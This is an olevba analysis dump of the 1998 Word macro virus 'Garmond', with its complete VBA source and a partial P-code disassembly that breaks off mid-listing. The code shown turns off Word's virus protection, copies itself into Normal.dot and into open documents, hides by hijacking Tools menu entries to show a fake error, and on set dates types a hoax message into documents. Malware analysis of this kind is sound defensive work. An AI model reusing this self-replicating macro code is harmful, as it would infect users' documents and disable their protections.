olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Garm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Garm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Garmond.bas 
in file: Virus.MSWord.Garm - OLE stream: 'Macros/VBA/Garmond'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Long live John Garmond
' Created by NAENBGOURSG
' Greece, x-mas 1998

Option Explicit

Public strTexts(11) As String

Function AlreadyInitialized()

    Dim varVbc As Variant
    
    For Each varVbc In ActiveDocument.VBProject.VBComponents
        If varVbc.Name = "Garmond" Then
            AlreadyInitialized = True
            Exit Function
        End If
    Next varVbc

    AlreadyInitialized = False

End Function

Sub AutoNew()

    Dim blCommunicated As Integer
    Dim strInfDate As String
        
    On Error Resume Next
    
    Options.VirusProtection = False
    
    Open "c:\grmd.cfg" For Input As #1
        
    If Err = 53 Then
        Open "c:\grmd.cfg" For Output As #1
        Print #1, 0
        Print #1, Now
        Close
        Exit Sub
    Else
        Input #1, blCommunicated
        Input #1, strInfDate
        Close
    End If
   
    If blCommunicated Then
        Application.OrganizerDelete Source:="normal.dot", _
        Name:="Garmond", Object:=wdOrganizerObjectProjectItems
        Exit Sub
    End If
    
    NormalTemplate.VBProject.VBComponents("Garmond").Export _
        NormalTemplate.Path & "/~wrl2561.tmp"
    ActiveDocument.VBProject.VBComponents.Import _
        NormalTemplate.Path & "/~wrl2561.tmp"
    Kill NormalTemplate.Path & "/~wrl2561.tmp"
   
    Randomize
    InitStealth
    
    If Month(Now) = 9 And Day(Now) = 27 Then
        SetStrings
        Application.OnTime 0.6, "Communicate"
    End If

End Sub

Sub AutoOpen()

    Dim blCommunicated As Integer
    Dim strInfDate As String
        
    On Error Resume Next
    
    Options.VirusProtection = False
    
    Application.OrganizerCopy _
        Source:=Application.ActiveDocument.FullName, _
        Destination:="Normal.dot", Name:="Garmond", Object:= _
        wdOrganizerObjectProjectItems
    
    Open "c:\grmd.cfg" For Input As #1
    
    If Err = 53 Then
        Open "c:\grmd.cfg" For Output As #1
        Print #1, 0
        Print #1, Now
        Close
        Exit Sub
    Else
        Input #1, blCommunicated
        Input #1, strInfDate
        Close
    End If
    
    If blCommunicated Then
        Application.OrganizerDelete Source:="normal.dot", _
        Name:="Garmond", Object:=wdOrganizerObjectProjectItems
        Exit Sub
    End If
    
    Randomize
    InitStealth
    
    If Not AlreadyInitialized Then
        NormalTemplate.VBProject.VBComponents("Garmond").Export _
            NormalTemplate.Path & "/~wrl2561.tmp"
        ActiveDocument.VBProject.VBComponents.Import _
            NormalTemplate.Path & "/~wrl2561.tmp"
        Kill NormalTemplate.Path & "/~wrl2561.tmp"
    End If
    
    If Month(Now) Mod 3 = 0 And Day(Now) = 28 Then
        SetStrings
        Application.OnTime 0.6, "Communicate"
    End If

End Sub

Sub Communicate()
Attribute Communicate.VB_Description = "Makro aufgezeichnet am 14.09.99 von Bernd Liebermann"
Attribute Communicate.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Makro1"

On Error Resume Next

Static intIndex As Integer
Dim intDelay As Long, i As Long, j As Long, tmp As Double

For i = 1 To Len(strTexts(intIndex))
    Selection.TypeText Mid(strTexts(intIndex), i, 1)
    intDelay = Int(25000 * Rnd)
    j = 0
    Do
        j = j + 1
        tmp = 2 ^ 0.5
    Loop Until j = intDelay
Next i

intIndex = intIndex + 1
Select Case intIndex
Case 1
    Application.OnTime Now + TimeValue("00:00:04"), "Communicate"
Case 2
    Application.OnTime Now + TimeValue("00:00:08"), "Communicate"
Case 3
    Application.OnTime Now + TimeValue("00:00:09"), "Communicate"
Case 4
    Application.OnTime Now + TimeValue("00:00:07"), "Communicate"
Case 5
    Application.OnTime Now + TimeValue("00:00:11"), "Communicate"
Case 6
    Application.OnTime Now + TimeValue("00:00:06"), "Communicate"
Case 7
    Application.OnTime Now + TimeValue("00:00:13"), "Communicate"
Case 8
    Application.OnTime Now + TimeValue("00:00:12"), "Communicate"
Case 9
    Application.OnTime Now + TimeValue("00:00:14"), "Communicate"
Case 10
    Application.OnTime Now + TimeValue("00:00:24"), "Communicate"
Case 11
    Application.OnTime Now + TimeValue("00:00:37"), "Communicate"
Case Else
    intIndex = 0
    For i = 0 To 11
        strTexts(i) = ""
    Next i
    Open "c:\grmd.cfg" For Output As #1
    Seek #1, 1
    Print #1, -1
    Close
    Application.OrganizerDelete NormalTemplate.FullName, "Garmond", _
        wdOrganizerObjectProjectItems
    Application.OrganizerDelete ThisDocument.FullName, "Garmond", _
        wdOrganizerObjectProjectItems
End Select

End Sub

Sub GenerateRndChars(ByVal intStrIndex As Integer)

    Dim intCountRndChars As Integer, intRndChar As Integer
    Dim j As Integer
    
    intCountRndChars = Int(Rnd * 70)

    For j = 1 To intCountRndChars
        intRndChar = Int(Rnd * 255) + 1
        If intRndChar = 13 Then GoTo GenerateRndChars_Next_j
        strTexts(intStrIndex) = strTexts(intStrIndex) & Chr(intRndChar)
GenerateRndChars_Next_j:
    Next j
                
End Sub

Sub ShowMsgBox()
    
    Dim intRndNumber As Integer
    
    intRndNumber = Int(Rnd * 10)
    
    If intRndNumber = 5 Then
        MsgBox "Internal Error #4259. Please contact the Microsoft " _
            & "Word Developer Team.", vbOKOnly + vbCritical, _
            "Microsoft Word"
    End If

End Sub

Sub SetStrings()

    Randomize
    GenerateRndChars 0
    strTexts(0) = strTexts(0) & "hello, can anybody hear me? my na"
    
    GenerateRndChars 1
    strTexts(1) = strTexts(1) & "me is john garmond. i got "
    strTexts(1) = strTexts(1) & "displaced in june 1996 on a boat "
    strTexts(1) = strTexts(1) & "trip near little abaco isl"
    
    GenerateRndChars 2
    strTexts(2) = strTexts(2) & "and. this is now almost 9 years ago "
    strTexts(2) = strTexts(2) & "and i can tell you THEY got me. i "
    strTexts(2) = strTexts(2) & "never believed in silly stuff like "
    
    GenerateRndChars 3
    strTexts(3) = strTexts(3) & "hat, but i'm forced to in very delic"
    strTexts(3) = strTexts(3) & "ate way. i'm not sure, if anybody is "
    strTexts(3) = strTexts(3) & "receiving this message, thi"
    
    GenerateRndChars 4
    strTexts(4) = strTexts(4) & "s is the first time that i got "
    strTexts(4) = strTexts(4) & "acces to their communicaters room. "
    strTexts(4) = strTexts(4) & "i do not have much time "
    
    GenerateRndChars 5
    strTexts(5) = strTexts(5) & "so i can't tell you much about our "
    strTexts(5) = strTexts(5) & "situation, but know: we're many, "
    strTexts(5) = strTexts(5) & "we're well up but we are prison"
    
    GenerateRndChars 6
    strTexts(6) = strTexts(6) & "ers. if you receive this message "
    strTexts(6) = strTexts(6) & "plese tell the nasa, the nsa and all"
    strTexts(6) = strTexts(6) & "other relevant organizations, taht"
    
    GenerateRndChars 7
    strTexts(7) = strTexts(7) & "they're here. we don't knoe their "
    strTexts(7) = strTexts(7) & "intentions, but they're grabbing "
    strTexts(7) = strTexts(7) & "more and more hum"
    
    GenerateRndChars 8
    strTexts(8) = strTexts(8) & "ans from earth. we need you're help "
    strTexts(8) = strTexts(8) & "!!! and you will also need help, "
    strTexts(8) = strTexts(8) & "mankind definetley relies on prot"
    
    GenerateRndChars 9
    GenerateRndChars 10
    GenerateRndChars 11
 
End Sub

Sub InitStealth()

    Dim c As Variant

    'On Error Resume Next

    For Each c In CommandBars("Tools").Controls
        If c.ID = 30017 Then
            c.Controls(1).OnAction = "ShowMsgBox"
            c.Controls(2).OnAction = ""
            c.Controls(3).OnAction = "ShowMsgBox"
'        ElseIf c.ID = 797 Then
'            c.OnAction = "ShowMsgBox"
'        ElseIf c.ID = 751 Then
'            c.OnAction = "ShowMsgBox"
        End If
    Next c
    
    CustomizationContext = NormalTemplate
    KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyF11, wdKeyAlt), _
        KeyCategory:=wdKeyCategoryCommand, Command:="FileNew"
    KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyNumeric0, wdKeyControl, _
        wdKeyAlt), KeyCategory:=wdKeyCategoryCommand, _
        Command:="SpookIsOver"

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Garm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Garmond - 14074 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0017 " Long live John Garmond"
' Line #1:
' 	QuoteRem 0x0000 0x0017 " Created by NAENBGOURSG"
' Line #2:
' 	QuoteRem 0x0000 0x0013 " Greece, x-mas 1998"
' Line #3:
' Line #4:
' 	Option  (Explicit)
' Line #5:
' Line #6:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x000B 
' 	VarDefn strTexts (As String)
' Line #7:
' Line #8:
' 	FuncDefn (Function AlreadyInitialized())
' Line #9:
' Line #10:
' 	Dim 
' 	VarDefn varVbc (As Variant)
' Line #11:
' Line #12:
' 	StartForVariable 
' 	Ld varVbc 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #13:
' 	Ld varVbc 
' 	MemLd New 
' 	LitStr 0x0007 "Garmond"
' 	Eq 
' 	IfBlock 
' Line #14:
' 	LitVarSpecial (True)
' 	St AlreadyInitialized 
' Line #15:
' 	ExitFunc 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	StartForVariable 
' 	Ld varVbc 
' 	EndForVariable 
' 	NextVar 
' Line #18:
' Line #19:
' 	LitVarSpecial (False)
' 	St AlreadyInitialized 
' Line #20:
' Line #21:
' 	EndFunc 
' Line #22:
' Line #23:
' 	FuncDefn (Sub AutoNew())
' Line #24:
' Line #25:
' 	Dim 
' 	VarDefn blCommunicated (As Integer)
' Line #26:
' 	Dim 
' 	VarDefn strInfDate (As String)
' Line #27:
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' Line #30:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #31:
' Line #32:
' 	LitStr 0x000B "c:\grmd.cfg"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #33:
' Line #34:
' 	Ld Err 
' 	LitDI2 0x0035 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	LitStr 0x000B "c:\grmd.cfg"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0000 
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Now 
' 	PrintItemNL 
' Line #38:
' 	CloseAll 
' Line #39:
' 	ExitSub 
' Line #40:
' 	ElseBlock 
' Line #41:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld blCommunicated 
' 	InputItem 
' 	InputDone 
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld strInfDate 
' 	InputItem 
' 	InputDone 
' Line #43:
' 	CloseAll 
' Line #44:
' 	EndIfBlock 
' Line #45:
' Line #46:
' 	Ld blCommunicated 
' 	IfBlock 
' Line #47:
' 	LineCont 0x0004 07 00 08 00
' 	LitStr 0x000A "normal.dot"
' 	ParamNamed Source 
' 	LitStr 0x0007 "Garmond"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #48:
' 	ExitSub 
' Line #49:
' 	EndIfBlock 
' Line #50:
' Line #51:
' 	LineCont 0x0004 0A 00 08 00
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x000D "/~wrl2561.tmp"
' 	Concat 
' 	LitStr 0x0007 "Garmond"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #52:
' 	LineCont 0x0004 07 00 08 00
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x000D "/~wrl2561.tmp"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #53:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x000D "/~wrl2561.tmp"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #54:
' Line #55:
' 	ArgsCall Read 0x0000 
' Line #56:
' 	ArgsCall InitStealth 0x0000 
' Line #57:
' Line #58:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001B 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #59:
' 	ArgsCall SetStrings 0x0000 
' Line #60:
' 	LitR8 0x3333 0x3333 0x3333 0x3FE3 
' 	LitStr 0x000B "Communicate"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #61:
' 	EndIfBlock 
' Line #62:
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Sub AutoOpen())
' Line #66:
' Line #67:
' 	Dim 
' 	VarDefn blCommunicated (As Integer)
' Line #68:
' 	Dim 
' 	VarDefn strInfDate (As String)
' Line #69:
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' Line #72:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #73:
' Line #74:
' 	LineCont 0x000C 03 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x000A "Normal.dot"
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Garmond"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #75:
' Line #76:
' 	LitStr 0x000B "c:\grmd.cfg"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #77:
' Line #78:
' 	Ld Err 
' 	LitDI2 0x0035 
' 	Eq 
' 	IfBlock 
' Line #79:
' 	LitStr 0x000B "c:\grmd.cfg"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0000 
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Now 
' 	PrintItemNL 
' Line #82:
' 	CloseAll 
' Line #83:
' 	ExitSub 
' Line #84:
' 	ElseBlock 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld blCommunicated 
' 	InputItem 
' 	InputDone 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld strInfDate 
' 	InputItem 
' 	InputDone 
' Line #87:
' 	CloseAll 
' Line #88:
' 	EndIfBlock 
' Line #89:
' Line #90:
' 	Ld blCommunicated 
' 	IfBlock 
' Line #91:
' 	LineCont 0x0004 07 00 08 00
' 	LitStr 0x000A "normal.dot"
' 	ParamNamed Source 
' 	LitStr 0x0007 "Garmond"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #92:
' 	ExitSub 
' Line #93:
' 	EndIfBlock 
' Line #94:
' Line #95:
' 	ArgsCall Read 0x0000 
' Line #96:
' 	ArgsCall InitStealth 0x0000 
' Line #97:
' Line #98:
' 	Ld AlreadyInitialized 
' 	Not 
' 	IfBlock 
' Line #99:
' 	LineCont 0x0004 0A 00 0C 00
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x000D "/~wrl2561.tmp"
' 	Concat 
' 	LitStr 0x0007 "Garmond"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #100:
' 	LineCont 0x0004 07 00 0C 00
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x000D "/~wrl2561.tmp"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #101:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x000D "/~wrl2561.tmp"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #102:
' 	EndIfBlock 
' Line #103:
' Line #104:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001C 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #105:
' 	ArgsCall SetStrings 0x0000 
' Line #106:
' 	LitR8 0x3333 0x3333 0x3333 0x3FE3 
' 	LitStr 0x000B "Communicate"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #107:
' 	EndIfBlock 
' Line #108:
' Line #109:
' 	EndSub 
' Line #110:
' Line #111:
' 	FuncDefn (Sub Communicate())
' Line #112:
' Line #113:
' 	OnError (Resume Next) 
' Line #114:
' Line #115:
' 	Dim (Static) 
' 	VarDefn intIndex (As Integer)
' Line #116:
' 	Dim 
' 	VarDefn intDelay (As Long)
' 	VarDefn i (As Long)
' 	VarDefn j (As Long)
' 	VarDefn tmp (As Double)
' Line #117:
' Line #118:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld intIndex 
' 	ArgsLd strTexts 0x0001 
' 	FnLen 
' 	For 
' Line #119:
' 	Ld intIndex 
' 	ArgsLd strTexts 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #120:
' 	LitDI2 0x61A8 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St intDelay 
' Line #121:
' 	LitDI2 0x0000 
' 	St j 
' Line #122:
' 	Do 
' Line #123:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #124:
' 	LitDI2 0x0002 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Pwr 
' 	St tmp 
' Line #125:
' 	Ld j 
' 	Ld intDelay 
' 	Eq 
' 	LoopUntil 
' Line #126:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #127:
' Line #128:
' 	Ld intIndex 
' 	LitDI2 0x0001 
' 	Add 
' 	St intIndex 
' Line #129:
' 	Ld intIndex 
' 	SelectCase 
' Line #130:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #131:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:04"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000B "Communicate"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #132:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #133:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:08"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000B "Communicate"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #134:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #135:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:09"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000B "Communicate"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #136:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #137:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:07"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000B "Communicate"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #138:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #139:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:11"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000B "Communicate"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #140:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #141:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:06"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000B "Communicate"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #142:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' Line #143:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:13"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000B "Communicate"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #144:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' Line #145:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:12"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000B "Communicate"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #146:
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' Line #147:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:14"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000B "Communicate"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #148:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' Line #149:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:24"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000B "Communicate"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #150:
' 	LitDI2 0x000B 
' 	Case 
' 	CaseDone 
' Line #151:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:37"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000B "Communicate"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #152:
' 	CaseElse 
' Line #153:
' 	LitDI2 0x0000 
' 	St intIndex 
' Line #154:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x000B 
' 	For 
' Line #155:
' 	LitStr 0x0000 ""
' 	Ld i 
' 	ArgsSt strTexts 0x0001 
' Line #156:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #157:
' 	LitStr 0x000B "c:\grmd.cfg"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDI2 0x0001 
' 	Seek 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0001 
' 	UMi 
' 	PrintItemNL 
' Line #160:
' 	CloseAll 
' Line #161:
' 	LineCont 0x0004 09 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x0007 "Garmond"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #162:
' 	LineCont 0x0004 09 00 08 00
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	LitStr 0x0007 "Garmond"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #163:
' 	EndSelect 
' Line #164:
' Line #165:
' 	EndSub 
' Line #166:
' Line #167:
' 	FuncDefn (Sub GenerateRndChars(ByVal intStrIndex As Integer))
' Line #168:
' Line #169:
' 	Dim 
' 	VarDefn intCountRndChars (As Integer)
' 	VarDefn intRndChar (As Integer)
' Line #170:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #171:
' Line #172:
' 	Ld Rnd 
' 	LitDI2 0x0046 
' 	Mul 
' 	FnInt 
' 	St intCountRndChars 
' Line #173:
' Line #174:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld intCountRndChars 
' 	For 
' Line #175:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St intRndChar 
' Line #176:
' 	Ld intRndChar 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo GenerateRndChars_Next_j 
' 	EndIf 
' Line #177:
' 	Ld intStrIndex 
' 	ArgsLd strTexts 0x0001 
' 	Ld intRndChar 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld intStrIndex 
' 	ArgsSt strTexts 0x0001 
' Line #178:
' 	Label GenerateRndChars_Next_j 
' Line #179:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #180:
' Line #181:
' 	EndSub 
' Line #182:
' Line #183:
' 	FuncDefn (Sub ShowMsgBox())
' Line #184:
' Line #185:
' 	Dim 
' 	VarDefn intRndNumber (As Integer)
' Line #186:
' Line #187:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St intRndNumber 
' Line #188:
' Line #189:
' 	Ld intRndNumber 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #190:
' 	LineCont 0x0008 02 00 0C 00 09 00 0C 00
' 	LitStr 0x0033 "Internal Error #4259. Please contact the Microsoft "
' 	LitStr 0x0014 "Word Developer Team."
' 	Concat 
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #191:
' 	EndIfBlock 
' Line #192:
' Line #193:
' 	EndSub 
' Line #194:
' Line #195:
' 	FuncDefn (Sub SetStrings())
' Line #196:
' Line #197:
' 	ArgsCall Read 0x0000 
' Line #198:
' 	LitDI2 0x0000 
' 	ArgsCall GenerateRndChars 0x0001 
' Line #199:
' 	LitDI2 0x0000 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0021 "hello, can anybody hear me? my na"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsSt strTexts 0x0001 
' Line #200:
' Line #201:
' 	LitDI2 0x0001 
' 	ArgsCall GenerateRndChars 0x0001 
' Line #202:
' 	LitDI2 0x0001 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x001A "me is john garmond. i got "
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsSt strTexts 0x0001 
' Line #203:
' 	LitDI2 0x0001 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0021 "displaced in june 1996 on a boat "
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsSt strTexts 0x0001 
' Line #204:
' 	LitDI2 0x0001 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x001A "trip near little abaco isl"
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsSt strTexts 0x0001 
' Line #205:
' Line #206:
' 	LitDI2 0x0002 
' 	ArgsCall GenerateRndChars 0x0001 
' Line #207:
' 	LitDI2 0x0002 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0024 "and. this is now almost 9 years ago "
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsSt strTexts 0x0001 
' Line #208:
' 	LitDI2 0x0002 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0022 "and i can tell you THEY got me. i "
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsSt strTexts 0x0001 
' Line #209:
' 	LitDI2 0x0002 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0023 "never believed in silly stuff like "
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsSt strTexts 0x0001 
' Line #210:
' Line #211:
' 	LitDI2 0x0003 
' 	ArgsCall GenerateRndChars 0x0001 
' Line #212:
' 	LitDI2 0x0003 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0024 "hat, but i'm forced to in very delic"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsSt strTexts 0x0001 
' Line #213:
' 	LitDI2 0x0003 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0025 "ate way. i'm not sure, if anybody is "
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsSt strTexts 0x0001 
' Line #214:
' 	LitDI2 0x0003 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x001B "receiving this message, thi"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsSt strTexts 0x0001 
' Line #215:
' Line #216:
' 	LitDI2 0x0004 
' 	ArgsCall GenerateRndChars 0x0001 
' Line #217:
' 	LitDI2 0x0004 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x001F "s is the first time that i got "
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsSt strTexts 0x0001 
' Line #218:
' 	LitDI2 0x0004 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0023 "acces to their communicaters room. "
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsSt strTexts 0x0001 
' Line #219:
' 	LitDI2 0x0004 
